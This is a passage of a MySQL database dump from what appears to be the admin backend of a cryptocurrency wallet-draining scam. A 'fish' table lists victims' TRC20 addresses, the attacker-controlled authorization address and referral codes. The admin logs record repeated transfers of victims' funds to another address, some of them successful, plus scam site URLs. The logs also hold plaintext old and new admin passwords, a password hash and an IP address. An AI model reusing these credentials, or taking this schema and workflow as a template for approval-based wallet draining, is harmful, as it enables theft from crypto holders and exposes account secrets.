-- MySQL dump 10.13  Distrib 5.7.34, for Linux (x86_64)
--
-- Host: localhost    Database: 6wwpro_xyz
-- ------------------------------------------------------
-- Server version	5.7.34-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `admin_logs`
--

DROP TABLE IF EXISTS `admin_logs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `admin_logs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `admin_id` bigint(20) NOT NULL DEFAULT '0' COMMENT '管理员id',
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '路由名称',
  `detail` text COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '发送的数据',
  `status` int(11) NOT NULL DEFAULT '0' COMMENT '操作状态 0 成功',
  `fail` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '失败原因',
  `ip` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT 'ip',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=45 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admin_logs`
--

LOCK TABLES `admin_logs` WRITE;
/*!40000 ALTER TABLE `admin_logs` DISABLE KEYS */;
INSERT INTO `admin_logs` VALUES (1,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',1,'登录密码错误','[\"154.23.190.201\"]','2022-02-11 10:33:25','2022-02-11 10:33:25'),(2,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-11 10:37:54','2022-02-11 10:37:54'),(3,1,'admin.auth.changePassword','{\"data\":{\"old\":\"wang1997\",\"new\":\"admin123\"},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-11 10:38:13','2022-02-11 10:38:13'),(4,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-11 10:38:27','2022-02-11 10:38:27'),(5,1,'admin.settings.update','{\"data\":{\"group\":\"config\",\"name\":\"url\",\"desc\":\"\\u7f51\\u7ad9\\u5730\\u5740\",\"value\":\"https:\\/\\/6wwpro.xyz\",\"id\":2},\"parameters\":{\"setting\":\"2\"}}',0,'','[\"154.23.190.201\"]','2022-02-11 10:39:20','2022-02-11 10:39:20'),(6,1,'admin.settings.update','{\"data\":{\"group\":\"authorize\",\"name\":\"trc20\",\"desc\":\"TRC20\\u6388\\u6743\\u5730\\u5740\",\"value\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"id\":5},\"parameters\":{\"setting\":\"5\"}}',0,'','[\"154.23.190.201\"]','2022-02-11 10:39:48','2022-02-11 10:39:48'),(7,1,'admin.settings.update','{\"data\":{\"group\":\"config\",\"name\":\"url\",\"desc\":\"\\u7f51\\u7ad9\\u5730\\u5740\",\"value\":\"https:\\/\\/7ii.club\",\"id\":2},\"parameters\":{\"setting\":\"2\"}}',0,'','[\"154.23.190.201\"]','2022-02-11 10:41:28','2022-02-11 10:41:28'),(8,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-11 11:45:28','2022-02-11 11:45:28'),(9,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-11 11:51:49','2022-02-11 11:51:49'),(10,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-11 11:53:13','2022-02-11 11:53:13'),(11,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-11 12:05:00','2022-02-11 12:05:00'),(12,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"0.5\",\"id\":2},\"parameters\":[]}',1,'数据不存在','[\"154.23.190.201\"]','2022-02-11 12:15:59','2022-02-11 12:15:59'),(13,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"0.5\",\"id\":2},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-11 12:17:55','2022-02-11 12:17:55'),(14,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: hash','[\"154.23.190.201\"]','2022-02-11 12:25:13','2022-02-11 12:25:13'),(15,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: hash','[\"154.23.190.201\"]','2022-02-11 12:26:28','2022-02-11 12:26:28'),(16,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'explode() expects parameter 2 to be string, array given','[\"154.23.190.201\"]','2022-02-11 12:27:07','2022-02-11 12:27:07'),(17,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: hash','[\"154.23.190.201\"]','2022-02-11 12:37:33','2022-02-11 12:37:33'),(18,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: hash','[\"154.23.190.201\"]','2022-02-11 12:37:52','2022-02-11 12:37:52'),(19,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: hash','[\"154.23.190.201\"]','2022-02-11 12:42:39','2022-02-11 12:42:39'),(20,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: hash','[\"154.23.190.201\"]','2022-02-11 12:43:42','2022-02-11 12:43:42'),(21,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: hash','[\"154.23.190.201\"]','2022-02-12 01:30:37','2022-02-12 01:30:37'),(22,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: balance','[\"154.23.190.201\"]','2022-02-12 01:33:33','2022-02-12 01:33:33'),(23,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: hash','[\"154.23.190.201\"]','2022-02-12 01:42:41','2022-02-12 01:42:41'),(24,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: hash','[\"154.23.190.201\"]','2022-02-12 01:43:10','2022-02-12 01:43:10'),(25,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'Undefined variable: hash','[\"154.23.190.201\"]','2022-02-12 01:43:36','2022-02-12 01:43:36'),(26,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-12 05:07:45','2022-02-12 05:07:45'),(27,0,'admin.auth.login','{\"data\":{\"username\":\"wang1998\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',1,'账号 不存在/已冻结!','[\"154.23.190.201\"]','2022-02-12 05:36:40','2022-02-12 05:36:40'),(28,0,'admin.auth.login','{\"data\":{\"username\":\"wang1998\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',1,'账号 不存在/已冻结!','[\"154.23.190.201\"]','2022-02-12 05:37:46','2022-02-12 05:37:46'),(29,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',1,'登录密码错误','[\"154.23.190.201\"]','2022-02-12 05:37:51','2022-02-12 05:37:51'),(30,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-12 05:37:59','2022-02-12 05:37:59'),(31,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-12 05:50:02','2022-02-12 05:50:02'),(32,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-12 06:28:44','2022-02-12 06:28:44'),(33,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-12 12:45:29','2022-02-12 12:45:29'),(34,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'转账失败','[\"154.23.190.201\"]','2022-02-12 12:48:25','2022-02-12 12:48:25'),(35,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-13 13:39:15','2022-02-13 13:39:15'),(36,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'转账失败','[\"154.23.190.201\"]','2022-02-13 13:48:55','2022-02-13 13:48:55'),(37,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'转账失败','[\"154.23.190.201\"]','2022-02-13 13:49:17','2022-02-13 13:49:17'),(38,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'转账失败','[\"154.23.190.201\"]','2022-02-13 13:52:07','2022-02-13 13:52:07'),(39,0,'admin.auth.login','{\"data\":{\"username\":\"admin\",\"captcha\":null,\"captcha_key\":null,\"auth_code\":null},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-14 03:37:18','2022-02-14 03:37:18'),(40,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'转账失败','[\"154.23.190.201\"]','2022-02-14 03:43:40','2022-02-14 03:43:40'),(41,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"1545112212\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',1,'接收地地址错误','[\"154.23.190.201\"]','2022-02-14 03:48:41','2022-02-14 03:48:41'),(42,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-14 04:04:11','2022-02-14 04:04:11'),(43,1,'admin.fish.transfer','{\"data\":{\"from\":\"TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A\",\"to\":\"TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo\",\"auth\":\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\",\"number\":\"1\",\"id\":2},\"parameters\":[]}',0,'','[\"154.23.190.201\"]','2022-02-14 04:08:40','2022-02-14 04:08:40'),(44,1,'admin.settings.update','{\"data\":{\"group\":\"config\",\"name\":\"url\",\"desc\":\"\\u524d\\u7aef\\u7f51\\u7ad9\\u5730\\u5740\",\"value\":\"https:\\/\\/7ii.club\",\"id\":2},\"parameters\":{\"setting\":\"2\"}}',0,'','[\"154.23.190.201\"]','2022-02-14 04:14:28','2022-02-14 04:14:28');
/*!40000 ALTER TABLE `admin_logs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `admins`
--

DROP TABLE IF EXISTS `admins`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `admins` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `password` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `nickname` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `two_auth_key` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `is_lock` tinyint(4) NOT NULL DEFAULT '0' COMMENT '0正常 1锁定',
  `last_ip` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `last_time` datetime NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `admins_username_unique` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admins`
--

LOCK TABLES `admins` WRITE;
/*!40000 ALTER TABLE `admins` DISABLE KEYS */;
INSERT INTO `admins` VALUES (1,'admin','$2y$10$lk1iB1pEN7iZeyqY7M0lauldxbKljXr5r28S4H.wu8FrOv.3E2jVi','admin','','','',0,'','2021-11-06 19:13:46','2021-11-06 11:13:46','2022-02-11 10:38:13');
/*!40000 ALTER TABLE `admins` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `failed_jobs`
--

DROP TABLE IF EXISTS `failed_jobs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `failed_jobs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `uuid` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `connection` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `failed_jobs_uuid_unique` (`uuid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `failed_jobs`
--

LOCK TABLES `failed_jobs` WRITE;
/*!40000 ALTER TABLE `failed_jobs` DISABLE KEYS */;
/*!40000 ALTER TABLE `failed_jobs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `fish`
--

DROP TABLE IF EXISTS `fish`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `fish` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `admin_id` bigint(20) NOT NULL DEFAULT '0' COMMENT '代理',
  `type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL COMMENT 'TRC ERC',
  `address` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL COMMENT 'address',
  `parent_id` bigint(20) NOT NULL DEFAULT '0' COMMENT '上级id',
  `path` text COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '上下级关系',
  `invite_code` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '邀请码',
  `hash` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'hash',
  `auth_address` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '授权地址',
  `balance` decimal(20,6) NOT NULL DEFAULT '0.000000' COMMENT '余额',
  `usdt` decimal(20,6) NOT NULL DEFAULT '0.000000' COMMENT 'USDT',
  `eth` decimal(30,15) NOT NULL DEFAULT '0.000000000000000' COMMENT 'ETH',
  `income` decimal(20,6) NOT NULL DEFAULT '0.000000' COMMENT '累计收益ETH',
  `status` tinyint(4) NOT NULL DEFAULT '0' COMMENT '0 无效 1 有效 2失效',
  `is_lock` tinyint(4) NOT NULL DEFAULT '0' COMMENT '1 锁定无法提款',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `fish_address_unique` (`address`),
  UNIQUE KEY `fish_invite_code_unique` (`invite_code`),
  UNIQUE KEY `fish_hash_unique` (`hash`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `fish`
--

LOCK TABLES `fish` WRITE;
/*!40000 ALTER TABLE `fish` DISABLE KEYS */;
INSERT INTO `fish` VALUES (1,1,'TRC20','TLQkJwXrSJ9V9TzzpPmDJ4QUbKsQTEQaLw',0,'0,1,','glsluut5',NULL,'',0.000000,0.000000,0.000000000000000,0.000000,0,0,'2022-02-11 11:19:16','2022-02-11 11:19:16'),(2,1,'TRC20','TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A',0,'0,2,','rminp9if','e1d4bf87601b61bc9da1c36b5b400230d581f765b57d6ce8bffdb4bae731bb64','TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp',0.000000,0.000000,0.000000000000000,0.000000,1,0,'2022-02-11 11:31:04','2022-02-14 04:08:40');
/*!40000 ALTER TABLE `fish` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `migrations` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `migrations`
--

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES (1,'2014_10_12_000000_create_users_table',1),(2,'2014_10_12_100000_create_password_resets_table',1),(3,'2019_08_19_000000_create_failed_jobs_table',1),(4,'2019_12_14_000001_create_personal_access_tokens_table',1),(5,'2021_06_01_122626_create_settings_table',1),(6,'2021_06_04_132943_create_admins_table',1),(7,'2021_07_01_053426_create_permission_tables',1),(8,'2021_07_01_053855_alter_permission_tables',1),(9,'2021_08_25_161300_create_admin_logs_table',1),(10,'2021_09_06_105948_create_whitelists_table',1),(11,'2021_10_03_163207_create_fish_table',1),(12,'2021_10_03_210117_create_transfers_table',1),(13,'2021_10_28_163220_create_transactions_table',1),(14,'2021_10_28_172314_create_withdraws_table',1),(15,'2021_10_29_195927_create_minings_table',1);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `minings`
--

DROP TABLE IF EXISTS `minings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `minings` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `fish_id` int(11) NOT NULL COMMENT '用户id',
  `date` date NOT NULL COMMENT '日期',
  `times` tinyint(4) NOT NULL COMMENT '发放次数',
  `balance` decimal(20,6) NOT NULL DEFAULT '0.000000' COMMENT '余额',
  `rate` decimal(10,4) NOT NULL DEFAULT '0.0000' COMMENT 'ETH汇率',
  `scale` decimal(10,4) NOT NULL DEFAULT '0.0000' COMMENT '奖励比例%',
  `amount` decimal(36,16) NOT NULL DEFAULT '0.0000000000000000' COMMENT '奖励金额',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `minings`
--

LOCK TABLES `minings` WRITE;
/*!40000 ALTER TABLE `minings` DISABLE KEYS */;
/*!40000 ALTER TABLE `minings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `model_has_permissions`
--

DROP TABLE IF EXISTS `model_has_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `model_has_permissions` (
  `permission_id` bigint(20) unsigned NOT NULL,
  `model_type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `model_id` bigint(20) unsigned NOT NULL,
  PRIMARY KEY (`permission_id`,`model_id`,`model_type`),
  KEY `model_has_permissions_model_id_model_type_index` (`model_id`,`model_type`),
  CONSTRAINT `model_has_permissions_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `model_has_permissions`
--

LOCK TABLES `model_has_permissions` WRITE;
/*!40000 ALTER TABLE `model_has_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `model_has_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `model_has_roles`
--

DROP TABLE IF EXISTS `model_has_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `model_has_roles` (
  `role_id` bigint(20) unsigned NOT NULL,
  `model_type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `model_id` bigint(20) unsigned NOT NULL,
  PRIMARY KEY (`role_id`,`model_id`,`model_type`),
  KEY `model_has_roles_model_id_model_type_index` (`model_id`,`model_type`),
  CONSTRAINT `model_has_roles_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `model_has_roles`
--

LOCK TABLES `model_has_roles` WRITE;
/*!40000 ALTER TABLE `model_has_roles` DISABLE KEYS */;
/*!40000 ALTER TABLE `model_has_roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `password_resets`
--

DROP TABLE IF EXISTS `password_resets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `password_resets` (
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  KEY `password_resets_email_index` (`email`)
